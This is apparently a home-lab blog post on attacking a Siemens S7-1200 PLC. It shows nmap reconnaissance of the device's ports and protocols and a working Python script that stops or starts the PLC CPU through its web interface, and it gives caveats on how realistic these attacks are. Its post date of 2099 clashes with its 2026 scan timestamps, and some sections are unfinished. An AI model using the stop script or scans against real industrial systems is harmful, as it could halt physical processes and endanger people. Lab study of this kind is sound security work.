---
layout: post
title: "Attacking the SIEMENS S7-1200 PLC"
subtitle: "Hacking PLCs for fun and for profit!"
date: 2099-09-23
description: "Looking at different attack vectors for the SIEMEN S7-1200 PLC CPU and how they can be exploited."
--- 

- [Goals](#goals)
- [Scanning](#scanning)
  - [Basic Scan](#basic-scan)
  - [Port Scan](#port-scan)
  - [Service Scan](#service-scan)
  - [Script Scans](#script-scans)
- [Attacks](#attacks)
  - [HTTP](#http)
  - [S7comm](#s7comm)
  - [OPC-UA](#opc-ua)
  - [Modbus](#modbus)
- [Final Thoughts](#final-thoughts)


## Goals
- Scan our PLC to see what we can learn
- Attack the different protocols exposed by the PLC

## Scanning
### Basic Scan
`nmap -Pn 10.0.0.10`

```  bash
Nmap scan report for 10.0.0.10
Host is up (0.014s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
```

### Port Scan
`nmap -Pn 10.0.0.10 -p 0-65535`

``` bash
Starting Nmap 7.97 ( https://nmap.org ) at 2026-07-23 11:38 +0100
Host is up (0.014s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
0/tcp    filtered unknown
80/tcp   open     http
102/tcp  open     iso-tsap
443/tcp  open     https
502/tcp  open     mbap
4840/tcp open     opcua-tcp

Nmap done: 1 IP address (1 host up) scanned in 712.71 seconds
```

### Service Scan
`nmap -Pn -sV 10.0.0.10 -p 80,102,443,502,4840`

``` bash
Starting Nmap 7.97 ( https://nmap.org ) at 2026-07-23 11:52 +0100
Nmap scan report for 10.0.0.10
Host is up (0.022s latency).
PORT     STATE SERVICE    VERSION
80/tcp   open  http
102/tcp  open  iso-tsap   Siemens S7 PLC
443/tcp  open  https?
502/tcp  open  mbap?
4840/tcp open  opcua-tcp?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.97%I=7%D=7/23%Time=6A61F270%P=arm-apple-darwin23.6.0%r(G
SF:etRequest,52,"HTTP/1\.0\x20400\r\ncontent-type:\x20text/html\r\ncontent
SF:-length:\x203\r\nconnection:\x20close\r\n\r\n400")%r(HTTPOptions,52,"HT
SF:TP/1\.0\x20400\r\ncontent-type:\x20text/html\r\ncontent-length:\x203\r\
SF:nconnection:\x20close\r\n\r\n400")%r(FourOhFourRequest,52,"HTTP/1\.0\x2
SF:0400\r\ncontent-type:\x20text/html\r\ncontent-length:\x203\r\nconnectio
SF:n:\x20close\r\n\r\n400");
Service Info: Device: specialized

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.22 seconds
```

### Script Scans
[S7 Info](https://nmap.org/nsedoc/scripts/s7-info.html)
`nmap -Pn 10.0.0.10 --script s7-info.nse -p 102`
``` bash
Starting Nmap 7.97 ( https://nmap.org ) at 2026-07-23 11:57 +0100
Nmap scan report for 10.0.0.10
Host is up (0.014s latency).

PORT    STATE SERVICE
102/tcp open  iso-tsap
| s7-info:
|   Module: 6ES7 212-1AE40-0XB0
|   Basic Hardware: 6ES7 212-1AE40-0XB0
|_  Version: 4.5.1
Service Info: Device: specialized

Nmap done: 1 IP address (1 host up) scanned in 31.03 seconds
```

[Modbus Discovery](https://nmap.org/nsedoc/scripts/modbus-discover.html)
`nmap -Pn 10.0.0.10 --script modbus-discover.nse --script-args='modbus-discover.aggressive=true' -p 502`

``` bash
Starting Nmap 7.97 ( https://nmap.org ) at 2026-07-23 11:58 +0100
Nmap scan report for 10.0.0.10
Host is up (0.014s latency).

PORT    STATE SERVICE
502/tcp open  modbus
| modbus-discover:
|   sid 0x1:
|     error: ILLEGAL FUNCTION
|   sid 0x1b:
|     error: ILLEGAL FUNCTION
|   sid 0x33:
|     error: ILLEGAL FUNCTION
|   sid 0x4b:
|     error: ILLEGAL FUNCTION
|   sid 0x67:
|     error: ILLEGAL FUNCTION
|   sid 0x7d:
|     error: ILLEGAL FUNCTION
|   sid 0x93:
|     error: ILLEGAL FUNCTION
|   sid 0xa9:
|     error: ILLEGAL FUNCTION
|   sid 0xc1:
|     error: ILLEGAL FUNCTION
|   sid 0xdc:
|     error: ILLEGAL FUNCTION
|   sid 0xf3:
|_    error: ILLEGAL FUNCTION

Nmap done: 1 IP address (1 host up) scanned in 10.08 seconds
```

[Profinet CM Lookup](https://nmap.org/nsedoc/scripts/profinet-cm-lookup.html)
`sudo nmap -Pn -sU 10.0.0.10 -p 34964 --script profinet-cm-lookup`

``` bash
Starting Nmap 7.97 ( https://nmap.org ) at 2026-07-23 11:59 +0100
Nmap scan report for 10.0.0.10
Host is up.

PORT      STATE SERVICE
34964/udp open  profinet-cm
| profinet-cm-lookup:
|   ipAddress: 10.0.0.10
|   annotationOffset: 0
|   annotationLength: 64
|_  annotation: S7-1200                   6ES7 212-1AE40-0XB0     14 V  4  5  1\x00

Nmap done: 1 IP address (1 host up) scanned in 2.68 seconds
```

[Multicast Profinet Discovery](https://nmap.org/nsedoc/scripts/multicast-profinet-discovery.html)
`nmap -Pn -sV --script=multicast-profinet-discovery 10.0.0.10`

``` bash
Starting Nmap 7.97 ( https://nmap.org ) at 2026-07-23 12:00 +0100
Nmap scan report for 10.0.0.10
Host is up (0.013s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
80/tcp  open  http
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 400
|     content-type: text/html
|     content-length: 3
|_    connection: close
443/tcp open  https?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.97%I=7%D=7/23%Time=6A61F47E%P=arm-apple-darwin23.6.0%r(G
SF:etRequest,52,"HTTP/1\.0\x20400\r\ncontent-type:\x20text/html\r\ncontent
SF:-length:\x203\r\nconnection:\x20close\r\n\r\n400")%r(HTTPOptions,52,"HT
SF:TP/1\.0\x20400\r\ncontent-type:\x20text/html\r\ncontent-length:\x203\r\
SF:nconnection:\x20close\r\n\r\n400")%r(FourOhFourRequest,52,"HTTP/1\.0\x2
SF:0400\r\ncontent-type:\x20text/html\r\ncontent-length:\x203\r\nconnectio
SF:n:\x20close\r\n\r\n400");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.99 seconds
```

## Attacks
https://github.com/moki-ics/s7-metasploit-modules

### HTTP
Lets check out the web service running on the PLC. I've configured it to be as insecure as possible.

When we first access the webpage, we land on the 'Start Page' where we are immediatly tempted by the big 'STOP' button. And if we click it...

![switching off the plc from the web](/blog/res/ot-lab-plc-web-off.gif)

Easy as that! We can even script it with a bit of python:

``` python
#!/usr/bin/env python3
"""
Usage:
    python3 cpu_command.py start 10.0.0.10
    python3 cpu_command.py stop 10.0.0.10
"""

import sys
import requests

def send_command(command: str, ip_address: str, port: int = 80, timeout: int = 5):
    url = f"http://{ip_address}/CPUCommands"
    payload = {command: 1,"PriNav":"Start"}
    headers = {"Referer": f"http://{ip_address}/"}    
    try:
        response = requests.post(url, data=payload, timeout=timeout,headers=headers)
        response.raise_for_status()
        print(f"Sent '{command}' to {ip_address} - status: {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <Run|Stop> <ip_address>")
        sys.exit(1)

    command = sys.argv[1].capitalize()
    ip_address = sys.argv[2]

    if command not in ("Run", "Stop"):
        print("Error: command must be 'Run' or 'Stop'")
        sys.exit(1)

    send_command(command, ip_address)

if __name__ == "__main__":
    main()
```

![switching the cpu on and off using the python script](/blog/res/ot-lab-plc-http-off-on.gif)

We can also snoop around the webpage to do some data gathering while we're here. We can find out:
- Serial Number
- Hardware Version
- Firmware Version
- Diagnostics Information
- Network Interface Details
- Any Uploaded Files (including recipes)
- and so much more!

This does all seem pretty scary, but lets put it in context:
- Web access can be disabled, and often times is.
- Even if it's enabled, it is often behind credential based access.
- Even if the access is open, it often isn't exposed to the internet.

Now of course, there are instances where it all goes wrong, but with a few good security controls, this type of risk can be nullified. 

### S7comm
We can take advantage of the S7comm protocol to manipulate the digital outputs at will.
Using [this](https://github.com/tijldeneut/ICSSecurityScripts/blob/master/S7-1200-Workshop.py) script, we can simply decide which outputs we want on and off, and run it.

![switching on and off all the DIs using the script](/blog/res/ot-lab-plc-s7comm-attack.gif)

**However, a caveat.** For the above demo, I put a blank project onto the PLC - removing all the ladder logic I'd be using before. I did this because, when my ladder logic was loaded, this attack didn't actually work. This is because the ladder logic instantly overwrote the adhoc input, nullifying the attack. This is a good point to remind you that articles like this, and many, many others, do not always reflect the reality of risk on site. Yes, OT sites are filled with unpatched devices, ancient operating systems, and bad network segmentation, but they are also extremly complex in their own right, with things like ladder logic and saftey systems that are not understood at all by folk in IT, or more traditional cyber security. Therefore, don't always let yourself be taken in by flashy attacks like the above. 

### OPC-UA
We dove deeper into OPC-UA in a previous article where we looked at how bad authentication practice could lead to tags being written to by strangers. Check if out [here](https://cdino.net/blog/2026/ot-lb-opc-ua-scanner) to see more.

TODO - other OPC-UA attack vectirs

### Modbus
Plain old TCP Modbus is about as insecure as you can get. Within the Modbus Protocol specification, there is no:
- Authentication
- Authorisation
- Encryption
- Integrity Checks
- Replay Protection

This makes Modbus quite a vulnerable protocol to run in your environment. This risk is naturally reduced due to defense in depth - with modbus traffic not usually coming past level 2, but if an attacker got that deep into your environment (or came in through the backdoor!) they can have a lot of fun playing with Modbus.

We could try a few different attacks here, but I want to focus on a MITM tampering attack. It's a slightly complex attack, so I'll be dedicating a whole article to it. We'll also look at a tool I made to help pull it off.

## Final Thoughts
TODO